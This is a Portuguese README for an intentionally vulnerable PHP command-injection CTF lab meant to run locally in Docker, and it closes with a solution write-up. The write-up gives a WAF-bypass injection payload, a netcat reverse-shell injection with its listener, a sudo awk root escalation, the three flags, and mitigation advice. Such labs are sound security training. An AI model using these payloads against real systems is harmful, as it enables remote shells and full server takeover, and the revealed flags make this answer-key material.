<div align="center">
  <h1>
    Laboratório de Command Injection (CTF Edition) 💻
  </h1>
</div>

<p align="center">
  <img alt="Linguagem Principal" src="https://img.shields.io/github/languages/top/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=777BB4">
  <img alt="Licença" src="https://img.shields.io/github/license/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=blue">
</p>

<p align="center">
  Um painel de diagnóstico de rede moderno (Aegis NOC) intencionalmente vulnerável a Injeção de Comandos de Sistema Operacional, projetado para exploração de vulnerabilidades web e pós-exploração Linux.
</p>

<p align="center">
  <a href="#-aviso-importante">Aviso</a> •
  <a href="#-objetivos-de-aprendizagem">Objetivos</a> •
  <a href="#-tecnologias-utilizadas">Tecnologias</a> •
  <a href="#-como-acessar-o-laboratório">Como Acessar</a> •
  <a href="#-jornada-de-exploração-ctf">Exploração (CTF)</a> •
  <a href="#-créditos">Créditos</a>
</p>

---

### ⚠️ Aviso Importante

> **Este projeto é intencionalmente vulnerável.** Ele foi criado para fins estritamente educacionais e demonstração de falhas de segurança. **NÃO FAÇA O DEPLOY DA VERSÃO DOCKER EM UM SERVIDOR PÚBLICO OU DE PRODUÇÃO.** Use-o apenas em um ambiente local isolado.

---

### 🎯 Objetivos de Aprendizagem

Este laboratório abrange desde a exploração inicial de uma aplicação web até o comprometimento total do servidor hospedeiro. Você treinará:

- **Command Injection (RCE):** Entender como a concatenação não tratada de variáveis em funções do sistema (como `shell_exec`) permite a execução arbitrária de código.
- **Evasão de Web Application Firewalls (WAF):** Aprender a utilizar comandos alternativos do Linux e *wildcards* para contornar listas de bloqueio (*blacklists*) restritivas.
- **Movimentação Lateral:** Compreender a importância das conexões de *Reverse Shell* para obter um terminal interativo com a máquina vítima.
- **Escalonamento de Privilégios (PrivEsc):** Explorar falhas de configuração em binários SUID e permissões do `sudo` (GTFOBins) para escalar o acesso de um usuário web até o superusuário `root`.

---

### 🛠️ Tecnologias Utilizadas

Este ambiente foi estruturado utilizando:

<p align="center">
  <a href="https://www.php.net/"><img src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" alt="PHP"></a>
  <a href="#"><img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" alt="JavaScript"></a>
  <a href="#"><img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="Tailwind"></a>
  <a href="https://www.docker.com/"><img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker"></a>
</p>

---

### ⚙️ Como Acessar o Laboratório

Este laboratório foi construído com duas opções de execução, adequando-se ao seu foco de estudo:

#### **Opção 1: Simulador Web (Estudo Básico)**
Uma versão interativa Front-end (100% Client-Side) projetada para você entender os conceitos de comandos encadeados sem a necessidade de baixar o projeto. *Nota: Este simulador ilustra mecânicas mais básicas do que o desafio Docker.*
🔗 **[Acesse o simulador aqui](https://vrsmarcos26.github.io/Lab-Command-Injection/simulador/)**

#### **Opção 2: Servidor Linux Real (CTF Completo - Via Docker)**
A experiência de segurança ofensiva definitiva. Um back-end em PHP comunicando-se com um contêiner Linux real, protegido por filtros de WAF e controles restritos de permissão.
1. Clone o Repositório:
```bash
git clone https://github.com/vrsmarcos26/Lab-Command-Injection.git
cd Lab-Command-Injection
```

2. Construa e suba o ambiente através do Docker:
```bash
docker-compose up --build -d
```


3. Acesse a aplicação no seu navegador: http://localhost:8000

### 🎬 Jornada de Exploração (CTF)

A ferramenta "Aegis NOC" permite realizar pings em hosts remotos, mas esconde uma falha estrutural. O desafio final (Opção Docker) exige a captura das seguintes *Flags*:

#### 🚩 Nível 1: Evasão de WAF (Acesso Inicial)
O painel bloqueia imediatamente a injeção de utilitários clássicos de leitura (ex: `cat`) e a palavra "flag". Seu objetivo é conseguir injetar um payload pela interface web que interaja com o sistema operacional para ler o arquivo oculto dentro de `assets_secretos`, utilizando formas não convencionais de invocar o console.

#### 🚩 Nível 2: Movimentação Lateral (Reverse Shell)
Encontrar arquivos via interface web não lhe dará controle do sistema. A segunda flag é de propriedade do usuário de sistema `aegis_admin` e exige interação pelo terminal para ser lida. Injete uma carga maliciosa no utilitário de ping que force o contêiner a abrir uma porta de rede e conectar um terminal de volta para a sua máquina (*Reverse Shell*).

#### 🚩 Nível 3: Escalonamento de Privilégios (Root)
Com o acesso shell obtido, você descobrirá que está rodando como o usuário restrito do apache (`www-data`). Este usuário não tem poderes para capturar a flag final, localizada na raiz do sistema (`/root`). Realize um mapeamento básico de permissões internas de servidor (como binários executados com sudo sem necessidade de senha) para obter credenciais de superusuário e assumir o domínio total do ambiente.

<details>
<summary><strong>💡 Resolução e Análise Técnica (Write-up)</strong></summary>

<br>

A falha reside na função `shell_exec()` do PHP, que recebe o valor do `ip` submetido e executa diretamente no sistema: `$output = shell_exec("ping -c 4 " . $ip);`.

#### Solução do Nível 1 (WAF Bypass)
O painel de diagnóstico concatena os comandos, porém uma lista negra (blacklist) tenta impedir leituras fáceis. Com operadores encadeados (`;` ou `&&`), usamos um utilitário Linux reverso como o `tac` e usamos wildcards `*` na busca do arquivo para não ter que digitar a palavra "flag".
* **Payload:** `127.0.0.1; tac assets_secretos/fl*`
* **Flag obtida:** `FLAG{1_w4f_byp4ss_m4st3r}`

#### Solução do Nível 2 (Reverse Shell)
O arquivo `flag_02.txt` exige estar logado no bash da máquina. Abriremos um *listener* Netcat local e mandaremos o servidor PHP se conectar nele, utilizando o `nc` embutido.
* Na sua máquina local, abra: `nc -lvnp 4444`
* **Payload Web:** `127.0.0.1; nc [SEU_IP] 4444 -e /bin/sh`
* Com a conexão ativa, leia o arquivo do admin: `cat /home/aegis_admin/flag_02.txt`
* **Flag obtida:** `FLAG{2_r3v3rs3_sh3ll_1ns1d3r}`

#### Solução do Nível 3 (PrivEsc)
Rodando o comando `sudo -l` na shell comprometida, observa-se a vulnerabilidade de permissão: o usuário `www-data` pode rodar a ferramenta `/usr/bin/awk` via sudo sem senha. Utilizando bibliotecas conhecidas como a *GTFOBins*, forçamos o `awk` a retornar um console já elevado como root.
* **Comando:** `sudo awk 'BEGIN {system("/bin/sh")}'`
* Como root, extraia o arquivo `/root/flag_03.txt`.
* **Flag obtida:** `FLAG{3_r00t_pr1v3sc_c0mm4nd_1nj3ct10n}`

**Como Mitigar:** As listas de bloqueio (Blacklist WAF) são sabidamente falhas. O PHP nunca deve encaminhar strings sujas para os binários. Na impossibilidade de evitar execuções de SO nativas, deve-se usar as funções como `escapeshellarg()` e `escapeshellcmd()` para escapar as entradas de maneira segura antes de seu acionamento.

</details>

-----

### 🙌 Créditos

Este projeto foi inspirado nos conceitos práticos de segurança ofensiva do **Hacking Club**, sendo estruturado para o aprimoramento em testes de invasão e pesquisa de vulnerabilidades web.

-----

### 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo LICENSE para mais detalhes.

<hr>

<p align="center">
Desenvolvido por <b>vrsmarcos26</b>
</p>
